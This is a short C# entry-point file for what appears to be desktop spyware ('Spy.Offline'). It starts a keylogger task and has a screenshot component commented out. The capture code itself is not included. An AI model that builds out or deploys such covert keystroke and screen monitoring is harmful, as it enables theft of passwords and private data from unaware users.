using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace HIT.Desktop.Spy.Offline
{
    public class Startup
    {
        public static void Main(string[] args)
        {
            var keylogger = new Keylogger();
            //var snapshooter = new Snapshooter();

            var keyloggerTask = Task.Run(() => keylogger.Start());
            //var snapshooterTask = Task.Run(() => snapshooter.Start());

            Task.WaitAll(keyloggerTask);
        }
    }
}
